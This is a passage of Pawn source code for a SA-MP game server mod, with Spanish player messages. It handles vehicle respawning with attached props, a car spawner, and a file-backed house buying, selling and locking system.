//-------------------------------------------
forward PosAfterSpec(playerid);
public PosAfterSpec(playerid)
{
	//SetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
	SetPlayerFacingAngle(playerid,Pos[playerid][3]);
}
#endif
//==============================================================================
forward EraseVehicleConObjetos();
public EraseVehicleConObjetos()
{
	if(!IsVehicleOccupied(vehobj)){
		for(new i=0;i<31;i++){
			DestroyObject(Obj[i]);
		}
		DestroyVehicle(vehobj);
		VehicleInfo[vehobj][ConObjetos] = 0;
		vehobj = 	 CreateVehicle(578, 298.2863, -1825.4189, 4.5336, 25.7385, -1, -1, 100);
		VehicleInfo[vehobj][ConObjetos] = 1;
		Obj[0] = 	 CreateObject(19128, -11.22240, -2.28324, 3.41254,   0.00000, 0.00000, 90.00000);
		Obj[1] = 	 CreateObject(19128, -11.22240, -6.28320, 3.41250,   0.00000, 0.00000, 90.00000);
		Obj[2] = 	 CreateObject(19420, -11.11920, -0.27869, 4.12812,   90.00000, 0.00000, 0.00000);
		Obj[3] = 	 CreateObject(19143, -12.42198, -0.35391, 4.86045,   0.00000, 0.00000, 180.00000);
		Obj[4] = 	 CreateObject(19144, -11.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
		Obj[5] = 	 CreateObject(19145, -11.42200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
		Obj[6] = 	 CreateObject(19146, -10.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
		Obj[7] = 	 CreateObject(19147, -10.42200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
		Obj[8] = 	 CreateObject(19148, -9.92200, -0.35390, 4.86050,   0.00000, 0.00000, 180.00000);
		Obj[9] = 	 CreateObject(19127, -13.07974, -8.11392, 4.01979,   0.00000, 0.00000, 0.00000);
		Obj[10] = 	 CreateObject(19127, -9.41040, -8.11390, 4.01980,   0.00000, 0.00000, 0.00000);
		Obj[11] = 	 CreateObject(19127, -9.41040, -0.61390, 4.01980,   0.00000, 0.00000, 0.00000);
		Obj[12] = 	 CreateObject(19127, -13.07970, -0.61390, 4.01980,   0.00000, 0.00000, 0.00000);
		Obj[13] = 	 CreateObject(18655, -9.37927, -0.61893, 3.46325,   0.00000, 0.00000, 56.00000);
		Obj[14] = 	 CreateObject(18655, -13.07000, -8.09340, 3.46330,   0.00000, 0.00000, -136.00000);
		Obj[15] = 	 CreateObject(1723, -10.22017, -7.53540, 3.39441,   0.00000, 0.00000, 180.00000);
		Obj[16] = 	 CreateObject(18651, -9.84851, 0.75535, 3.35982,   0.00000, 0.00000, 0.00000);
		Obj[17] = 	 CreateObject(18651, -12.41032, 0.73555, 3.35980,   0.00000, 0.00000, 0.00000);
		Obj[18] = 	 CreateObject(2232, -9.87104, -1.44249, 4.04030,   0.00000, 0.00000, -20.00000);
		Obj[19] = 	 CreateObject(2232, -12.45320, -1.37381, 4.04030,   0.00000, 0.00000, 20.00000);
		Obj[20] = 	 CreateObject(19087, -9.42067, -8.12922, 4.42657,   90.00000, 0.00000, 0.00000);
		Obj[21] = 	 CreateObject(19087, -9.42070, -6.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[22] = 	 CreateObject(19087, -9.42070, -4.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[23] = 	 CreateObject(19087, -9.42070, -3.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[24] = 	 CreateObject(19087, -13.07330, -8.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[25] = 	 CreateObject(19087, -13.07330, -6.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[26] = 	 CreateObject(19087, -13.07330, -4.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[27] = 	 CreateObject(19087, -13.07330, -3.12920, 4.42660,   90.00000, 0.00000, 0.00000);
		Obj[28] = 	 CreateObject(19087, -9.48827, -8.10955, 4.42660,   90.00000, 0.00000, 90.00000);
		Obj[29] = 	 CreateObject(19087, -10.48830, -8.10950, 4.42660,   90.00000, 0.00000, 90.00000);
		Obj[30] = 	 CreateObject(642, -12.10328, -6.22676, 4.83699,   0.00000, 0.00000, 0.00000);
		AttachObjectToVehicle(Obj[0], vehobj, -0.064399, 0.324759, -0.206860,  0.000000, 0.000000, 90.000000);
		AttachObjectToVehicle(Obj[1], vehobj, -0.064399, -3.675199, -0.206900,  0.000000, 0.000000, 90.000000);
		AttachObjectToVehicle(Obj[2], vehobj, 0.038800, 2.329309, 0.508719,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[3], vehobj, -1.263979, 2.254090, 1.241049,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[4], vehobj, -0.763999, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[5], vehobj, -0.263999, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[6], vehobj, 0.236000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[7], vehobj, 0.736000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[8], vehobj, 1.236000, 2.254100, 1.241099,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[9], vehobj, -1.921739, -5.505920, 0.400390,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[10], vehobj, 1.747599, -5.505900, 0.400400,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[11], vehobj, 1.747599, 1.994100, 0.400400,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[12], vehobj, -1.921700, 1.994100, 0.400400,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[13], vehobj, 1.778730, 1.989070, -0.156150,  0.000000, 0.000000, 56.000000);
		AttachObjectToVehicle(Obj[14], vehobj, -1.911999, -5.485400, -0.156100,  0.000000, 0.000000, -136.000000);
		AttachObjectToVehicle(Obj[15], vehobj, 0.937829, -4.927399, -0.224990,  0.000000, 0.000000, 180.000000);
		AttachObjectToVehicle(Obj[16], vehobj, 1.309490, 3.363349, -0.259580,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[17], vehobj, -1.252320, 3.343549, -0.259599,  0.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[18], vehobj, 1.286959, 1.165510, 0.420899,  0.000000, 0.000000, -20.000000);
		AttachObjectToVehicle(Obj[19], vehobj, -1.295200, 1.234189, 0.420899,  0.000000, 0.000000, 20.000000);
		AttachObjectToVehicle(Obj[20], vehobj, 1.737330, -5.521220, 0.807169,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[21], vehobj, 1.737299, -3.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[22], vehobj, 1.737299, -1.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[23], vehobj, 1.737299, -0.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[24], vehobj, -1.915300, -5.521200, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[25], vehobj, -1.915300, -3.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[26], vehobj, -1.915300, -1.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[27], vehobj, -1.915300, -0.521199, 0.807199,  90.000000, 0.000000, 0.000000);
		AttachObjectToVehicle(Obj[28], vehobj, 1.669730, -5.501550, 0.807199,  90.000000, 0.000000, 90.000000);
		AttachObjectToVehicle(Obj[29], vehobj, 0.669699, -5.501500, 0.807199,  90.000000, 0.000000, 90.000000);
		AttachObjectToVehicle(Obj[30], vehobj, -0.945280, -3.618759, 1.217589,  0.000000, 0.000000, 0.000000);
	}
	if(!IsVehicleOccupied(veh1)){
		for(new i=0;i<2;i++){
			DestroyObject(Obj1[i]);
		}
		DestroyVehicle(veh1);
		VehicleInfo[veh1][ConObjetos] = 0;
		veh1 = 	 CreateVehicle(463, -1428.7313, 2165.5103, 49.8121, 278.0257, -1, -1, 100);
		VehicleInfo[veh1][ConObjetos] = 1;
		Obj1[0] = 	 CreateObject(362,0,0,-1000,0,0,0,100);
		Obj1[1] = 	 CreateObject(362,0,0,-1000,0,0,0,100);
		AttachObjectToVehicle(Obj1[0], veh1, -0.225000,0.150000,0.450000,0.000000,21.600002,94.499977);
		AttachObjectToVehicle(Obj1[1], veh1, 0.375000,0.150000,0.450000,0.000000,21.600002,94.499977);	
	}
	return 1;
}


forward EraseVehicle(vehicleid);
public EraseVehicle(vehicleid)
{
	if(!IsVehicleOccupied(vehicleid)){
		if(VehicleInfo[vehicleid][Temp] == 1) {
			DestroyVehicle(vehicleid);
			VehicleInfo[vehicleid][Temp] = 0;
			return 1;
		}
		if(VehicleInfo[vehicleid][ConObjetos] != 1){
			DestroyVehicle(vehicleid);
			onsys[vehicleid] = 1;
			CreateVehicle(VehicleInfo[vehicleid][model],VehicleInfo[vehicleid][x_spawn],VehicleInfo[vehicleid][y_spawn],VehicleInfo[vehicleid][z_spawn],VehicleInfo[vehicleid][za_spawn],VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
			ModVehicle(vehicleid);
			return 1;
		}
	}
	return 1;
}

forward VehicleCleanup();
public VehicleCleanup() {
	for(new v=0;v<MAX_VEHICLES;v++) if(!IsVehicleOccupied(v)) EraseVehicle(v);
}

stock IsVehicleOccupied(vehicleid)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerInVehicle(i,vehicleid)) return 1;
	}
	return 0;
}
// if you use the commented way below
stock GetVehicleDriver(vehicleid)
{
    for(new i; i<MAX_PLAYERS; i++)
    {
        if (IsPlayerInVehicle(i, vehicleid))
        {
            if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
            {
				return i;
            }
		}
    }
    return -1;
}
//==============================================================================
forward CarSpawner(playerid,cmodel);
public CarSpawner(playerid,cmodel)
{
	if(IsPlayerInAnyVehicle(playerid)) return 1;
	//if((PlayerInfo[playerid][Level] < 1) && ((cmodel == 425) || (cmodel == 520) || (cmodel == 447) || (cmodel == 464) || (cmodel == 476) || (cmodel == 432))) {
		//SendClientMessage(playerid, COLOR_BRIGHTRED, "You must be admin to spawn this vehicle");
		//return 1;
	//}
 	else
	{
    	new Float:x, Float:y, Float:z, Float:angle;
	 	GetPlayerPos(playerid, x, y, z);
	 	GetPlayerFacingAngle(playerid, angle);
	    new ctsvehicle=CreateVehicle(cmodel, x, y, z, angle, -1, -1, 10000);
		PutPlayerInVehicle(playerid, ctsvehicle, 0);
		SetVehicleVirtualWorld(ctsvehicle, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(ctsvehicle, GetPlayerInterior(playerid));
		VehicleInfo[ctsvehicle][Temp] = 1;
		//ChangeVehicleColor(ctsvehicle,0,7);
	}
	return 1;
}

forward CarDeleter(vehicleid);
public CarDeleter(vehicleid)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
	new Float:X,Float:Y,Float:Z;
	if(IsPlayerInVehicle(i, vehicleid))
	{
		RemovePlayerFromVehicle(i);
		GetPlayerPos(i,X,Y,Z);
		SetPlayerPos(i,X,Y+3,Z);
	}
		SetVehicleParamsForPlayer(vehicleid,i,0,1);
	}
		SetTimerEx("VehRes",1500,0,"i",vehicleid);
}

//==============================================================================
forward TuneLCar(VehicleID);
public TuneLCar(VehicleID)
{
	ChangeVehicleColor(VehicleID,0,7);
	AddVehicleComponent(VehicleID, 1010);
	AddVehicleComponent(VehicleID, 1087);
}
//=============================SHS Functions====================================
AddHouse(houseid, Float:iconX, Float:iconY, Float:iconZ, Float:interiorX, Float:interiorY, Float:interiorZ, Costa, Sella, Interiora, virtualworld)
{
	new house[256];
	format(house, sizeof(house), "SATDM/Houses/houseid%d",houseid);
	if(!dini_Exists(house))
	{
		dini_Create(house);
		format(hInfo[houseid][Name], 24, DEFAULT_OWNER);
		dini_Set(house, "Name", DEFAULT_OWNER);
		format(hInfo[houseid][Renter], 24, "ForRent");
		dini_Set(house, "Renter", "ForRent");
		hInfo[houseid][Rentable] = 0;
		dini_IntSet(house, "Rentable", 0);
		hInfo[houseid][Rentcost] = 0;
		dini_IntSet(house, "Rentcost", 0);
		hInfo[houseid][Cost] = Costa;
		dini_IntSet(house, "Cost", Costa);
		hInfo[houseid][Sell] = Sella;
		dini_IntSet(house, "Sell", Sella);
		hInfo[houseid][Interior] = Interiora;
		dini_IntSet(house, "Interior", Interiora);
		dini_IntSet(house, "Virtualworld", virtualworld);
		hInfo[houseid][Virtualworld] = virtualworld;
		hInfo[houseid][Locked] = 1;
		dini_IntSet(house, "Locked", 1);
		hInfo[houseid][InteriorX] = interiorX;
		hInfo[houseid][InteriorY] = interiorY;
		hInfo[houseid][InteriorZ] = interiorZ;
		dini_FloatSet(house, "X", interiorX);
		dini_FloatSet(house, "Y", interiorY);
		dini_FloatSet(house, "Z", interiorZ);
		dini_IntSet(house, "RentPay", 0);
		dini_IntSet(house, "RentGet", 0);
		print("-");
		print("--------------House Created--------------");
		printf("- Houseid: %d", houseid);
		printf("- Buy Cost: %d", Costa);
		printf("- Sell Cost: %d", Sella);
		printf("- Interior: %d", Interiora);
		printf("- VirtualWorld: %d", virtualworld);
		print("-----------------------------------------");
		print("-");
	}
	else
	{
	    format(hInfo[houseid][Name], 24, dini_Get(house, "Name"));
	    format(hInfo[houseid][Renter], 24, dini_Get(house, "Renter"));
		hInfo[houseid][Rentable] = dini_Int(house, "Rentable");
		hInfo[houseid][Rentcost] = dini_Int(house, "Rentcost");
	    hInfo[houseid][Cost] = dini_Int(house, "Cost");
	    hInfo[houseid][Sell] = dini_Int(house, "Sell");
	    hInfo[houseid][Interior] = dini_Int(house, "Interior");
	    hInfo[houseid][Locked] = dini_Int(house, "Locked");
	    hInfo[houseid][InteriorX] = dini_Float(house, "X");
	    hInfo[houseid][InteriorY] = dini_Float(house, "Y");
		hInfo[houseid][InteriorZ] = dini_Float(house, "Z");
		hInfo[houseid][Virtualworld] = dini_Int(house, "Virtualworld");
	}
    hInfo[houseid][iconx]=iconX;
	hInfo[houseid][icony]=iconY;
	hInfo[houseid][iconz]=iconZ;
	format(house, sizeof(house), "SATDM/Houses/houseid%d",houseid);
	hTextInfo[houseid] = Text3D:INVALID_3DTEXT_ID;
	new hnowner[25];
	format(hnowner,128,"%s",hInfo[houseid][Name]);
	if(strcmp(hInfo[houseid][Name],DEFAULT_OWNER,true)==0)
	{
		format(hnowner,128,"En Venta");
		hTextInfo[houseid] = CreateDynamic3DTextLabel(hnowner,0x00FF00FF,iconX,iconY,iconZ+0.75,40);
		HousePickup[houseid] = CreateDynamicPickup(1273, 23, iconX, iconY, iconZ);//not bought
		housemapicon[houseid] = CreateDynamicMapIcon(iconX, iconY, iconZ,31,c_y);
	}
	else
	{
 		hTextInfo[houseid] = CreateDynamic3DTextLabel(hnowner,0xFF0000FF,iconX,iconY,iconZ+0.75,40);
		HousePickup[houseid] = CreateDynamicPickup(1272,23, iconX, iconY, iconZ);//bought
		housemapicon[houseid] = CreateDynamicMapIcon(iconX, iconY, iconZ,32,c_y);
	}
}


stock SpawnPlayerAtHouse(playerid)
{
	new str1[256],pname[24],str[256];
	GetPlayerName(playerid, pname, sizeof(pname));
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if (dini_Exists(str1))
	{
		if(dini_Int(str1,"Houseid")!=-255)
		{
			new Float:x,Float:y,Float:z;
			str = dini_Get(str1,"SpawnInt");
			SetPlayerInterior(playerid, strval(str));
			playerinterior[playerid] = strval(str);
    		x = dini_Float(str1,"SpawnX");
	  		y = dini_Float(str1,"SpawnY");
	  		z = dini_Float(str1,"SpawnZ");
			SetPlayerPos(playerid, x, y, z);
			//TogglePlayerControllable(playerid, 0);
			//SetTimerEx("UnfreezeTele",2000, 0, "i", playerid);
		}
	}
	return 1;
}
public UnfreezeTele(playerid)
{
	TogglePlayerControllable(playerid, 1);
}


GetHouseStats(playerid, hid)
{
	new str2[128];
	new hnowner[128];
	new phname[MAX_PLAYER_NAME];
	GetPlayerName(playerid,phname,sizeof(phname));
	format(hnowner,128,"%s",hInfo[hid][Name]);
	if(strcmp(hInfo[hid][Name],DEFAULT_OWNER,true)==0)
	{
	    format(hnowner,128,"En Venta");
    }
	if(strcmp(hInfo[hid][Renter],"ForRent",true))
	{
		if(strcmp(hnowner,phname,true)==0){
		}
			format(str2, sizeof(str2),"~g~Propietario: ~w~%s ~g~~n~~g~Rentada a: ~w~$%s ~n~~g~Precio: ~w~$%i",hnowner,hInfo[hid][Renter],hInfo[hid][Cost]);
			GameTextForPlayer(playerid,str2, 2500, 3);
	}
	else{
		if(strcmp(hnowner,phname,true)==0){
		}
			format(str2, sizeof(str2),"~g~Propietario: ~w~%s ~n~~g~Precio: ~w~$%i",hnowner,hInfo[hid][Cost]);
			GameTextForPlayer(playerid,str2, 2500, 3);
	}
}

CMD:sellh(playerid,params[])
{
	new str[255],str1[256],pname[24],housenumber;
	housenumber = GetHouseID(playerid);
	GetPlayerName(playerid, pname, 24);
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if (strcmp(hInfo[housenumber][Name],pname,false)) return SendClientMessage(playerid, red, "|Info| »{EAEAEA} Esta casa no es tuya.");
	new hsstring[128];
	format(hsstring, sizeof(hsstring), "|Info| »{0080FF} %s{FFFFFF} vendio la casa #%i por {52C433}$%d.", pname, housenumber, hInfo[housenumber][Sell]);
	SendClientMessageToAll(red, hsstring);

	SendClientMessage(playerid, red, "|Info|{FFFFFF}Has vendido tu casa!");
  	format(str, sizeof(str), "%s has sold houseid %i",pname,housenumber);
	print(str);
	GivePlayerMoney(playerid, hInfo[housenumber][Sell]);
    dini_Set(str1, "Name", DEFAULT_OWNER);
    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if (!dini_Exists(str1)) dini_Create(str1);
	dini_IntSet(str1, "Houseid", -255);
	dini_IntSet(str1, "Rentid", -255);
	DestroyDynamicPickup(HousePickup[housenumber]);
	HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

	new hnowner[30];
	format(hnowner,128,"%s",hInfo[housenumber][Name]);
	if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
    	format(hnowner,128,"En Venta");
	}
	UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
	DestroyDynamicMapIcon(housemapicon[housenumber]);
	housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
 	return 1;
}

CMD:asellh(playerid,params[])
{
	new str1[255],pname[24],housenumber;
	housenumber = GetHouseID(playerid);
	GetPlayerName(playerid, pname, 24);
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
//		GivePlayerMoney(playerid, hInfo[housenumber][Sell]);
		format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(hInfo[housenumber][Name]));
	    dini_Set(str1, "Name", DEFAULT_OWNER);
	    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
	    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);
		if (!dini_Exists(str1)) dini_Create(str1);
		dini_IntSet(str1, "Houseid", -255);
		dini_IntSet(str1, "Rentid", -255);
		dini_IntSet(str1, "money", dini_Int(str1, "money")+hInfo[housenumber][Sell]);
		DestroyDynamicPickup(HousePickup[housenumber]);
		HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

		new hnowner[30];
		format(hnowner,128,"%s",hInfo[housenumber][Name]);
		if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
	    	format(hnowner,128,"En Venta");
		}
		UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
		DestroyDynamicMapIcon(housemapicon[housenumber]);
		housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
	}
 	return 1;
}

stock asellhs(playerid)
{
	new str1[256],pname[24],housenumber;
	GetPlayerName(playerid, pname, 24);
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		new hsstring[128];
		format(str1, sizeof(str1), "ladmin/users/%s.sav", pname);
		housenumber = dini_Int(str1, "Houseid");
		if (!dini_Exists(str1)) dini_Create(str1);
		dini_IntSet(str1, "Houseid", -255);
		dini_IntSet(str1, "Rentid", -255);
		dini_IntSet(str1, "money", dini_Int(str1, "money")+hInfo[housenumber][Sell]);
		DestroyDynamicPickup(HousePickup[housenumber]);
		HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

		format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
		GivePlayerMoney(playerid, hInfo[housenumber][Sell]);
	    dini_Set(str1, "Name", DEFAULT_OWNER);
	    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
	    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);

		new hnowner[30];
		format(hnowner,128,"%s",hInfo[housenumber][Name]);
		if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
	    	format(hnowner,128,"En Venta");
		}
		UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
		DestroyDynamicMapIcon(housemapicon[housenumber]);
		housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
	}
 	return 1;
}

stock aresetallhs()
{
	for(new p = 0; p < MAX_PLAYERS; p++){
	    if(IsPlayerConnected(p) == 1) {
	        new tpname[MAX_PLAYER_NAME];
	        GetPlayerName(p,tpname,sizeof(tpname));
		   	dUserSetINT(tpname).("Houseid", -255);
			dUserSetINT(tpname).("Rentid", -255);
			dUserSetINT(tpname).("SpawnX", 0);
			dUserSetINT(tpname).("SpawnY", 0);
			dUserSetINT(tpname).("SpawnZ", 0);
			dUserSetINT(tpname).("SpawnInt", 0);
		}
	}
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "Houseid", -255);
		dini_IntSet(fname, "Rentid", -255);
		dini_IntSet(fname, "SpawnX", 0);
		dini_IntSet(fname, "SpawnY", 0);
		dini_IntSet(fname, "SpawnZ", 0);
		dini_IntSet(fname, "SpawnInt", 0);
	}
	for(new housenumber = 0; housenumber < MAX_HOUSES; housenumber++){
	    new str1[256];
	   	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
		fremove(str1);
	}
}

CMD:buyh(playerid,params[])
{
    //if(GetPlayerScore(playerid)<=-75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder comprar casas.");
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	new str[255],str1[255],pname[24], housenumber;
	housenumber = GetHouseID(playerid);
	if(housenumber == -1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar cerca del icono.");

	GetPlayerName(playerid, pname, 24);
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if(dini_Exists(str1))
	{
		if (dini_Int(str1, "Houseid")!=-255) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo puedes comprar 1 casa.");
	}
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	if (strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,true)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Esta casa no esta en venta.");
	if(GetPlayerMoney(playerid)<hInfo[housenumber][Cost]) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Dinero insuficiente.");

	new hsstring[128];
	format(hsstring, sizeof(hsstring), "|Info| »{0080FF} %s{EAEAEA} compro la casa #%i por {52C433}$%d.", pname, housenumber, hInfo[housenumber][Cost]);
	SendClientMessageToAll(red, hsstring);

//	SendClientMessage(playerid, c_y, "You have bought the house!");
	format(str, sizeof(str), "%s has bought houseid %i",pname,housenumber);
	print(str);
	GivePlayerMoney(playerid, -hInfo[housenumber][Cost]);
    dini_Set(str1, "Name", pname);
    hInfo[housenumber][Name]=pname;
    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",0);

	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if (!dini_Exists(str1)) dini_Create(str1);
	new Float:sy, Float:sx, Float:sz;
	dini_IntSet(str1, "Houseid", housenumber);
	if(!dini_Isset(str1,"Rentid"))
	{
		dini_IntSet(str1, "Rentid", -255);
	}
	GetPlayerPos(playerid, sx,sy,sz);
	dini_FloatSet(str1, "SpawnX", sx);
	dini_FloatSet(str1, "SpawnY", sy);
	dini_FloatSet(str1, "SpawnZ", sz);
	dini_IntSet(str1, "SpawnInt", GetPlayerInterior(playerid));
	DestroyDynamicPickup(HousePickup[housenumber]);
	HousePickup[housenumber] = CreateDynamicPickup(1272, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

	new hnowner[30];
	format(hnowner,128,"%s",hInfo[housenumber][Name]);
	if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
    	format(hnowner,128,"En Venta");
	}
	UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0xFF0000FF,hnowner);
	DestroyDynamicMapIcon(housemapicon[housenumber]);
	housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],32,c_y);
	SavePlayer(playerid);
	return 1;
}

CMD:comprarcasa(playerid,params[]){
	#pragma unused params
	cmd_buyh(playerid,"\1");
	return 1;
}

CMD:lockh(playerid,params[])
{
    #pragma unused params
	new str1[256],pname[24],housenumber;
	housenumber = GetHouseID(playerid);
	GetPlayerName(playerid, pname, 24);
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	if(strcmp(hInfo[housenumber][Name],pname,true)==0)
	{
 		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has bloqueado tu casa.");
    	dini_IntSet(str1,"Locked",1);
    	hInfo[housenumber][Locked] = 1;
    }
    else if(strcmp(hInfo[housenumber][Renter],pname,true)==0)
    {
        SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has bloqueado tu casa.");
    	dini_IntSet(str1,"Locked",1);
    	hInfo[housenumber][Locked] = 1;
    }
	else if((strcmp(hInfo[housenumber][Name],pname,true)==0) && (GetPlayerInterior(playerid)==playerinterior[playerid]))
	{
 		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Te has encerrado en tu casa.");
    	dini_IntSet(str1,"Locked",1);
    	hInfo[housenumber][Locked] = 1;
    }
    else if((strcmp(hInfo[housenumber][Renter],pname,true)==0) && (GetPlayerInterior(playerid)==playerinterior[playerid]))
    {
        SendClientMessage(playerid, red, "|Info| »{EAEAEA} Te has encerrado en tu casa.");
    	dini_IntSet(str1,"Locked",1);
    	hInfo[housenumber][Locked] = 1;
    }
    else
    {
        SendClientMessage(playerid, red, "|Error| »{EAEAEA} Esta casa no es tuya.");
    }
	return 1;
}

CMD:unlockh(playerid,params[])
{
	new str1[256],pname[24],housenumber;
	housenumber = GetHouseID(playerid);
	GetPlayerName(playerid, pname, 24);
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	if(strcmp(hInfo[housenumber][Name],pname,true)==0)
	{
 		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desbloqueado tu casa.");
    	dini_IntSet(str1,"Locked",0);
    	hInfo[housenumber][Locked] = 0;
    }
    else if(strcmp(hInfo[housenumber][Renter],pname,true)==0)
    {
        SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desbloqueado tu casa.");
    	dini_IntSet(str1,"Locked",0);
    	hInfo[housenumber][Locked] = 0;
    }
	else if((strcmp(hInfo[housenumber][Name],pname,true)==0) && (GetPlayerInterior(playerid)==playerinterior[playerid]))
	{
 		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desbloqueado tu casa.");
    	dini_IntSet(str1,"Locked",0);
    	hInfo[housenumber][Locked] = 0;
    }
    else if((strcmp(hInfo[housenumber][Renter],pname,true)==0) && (GetPlayerInterior(playerid)==playerinterior[playerid]))
    {
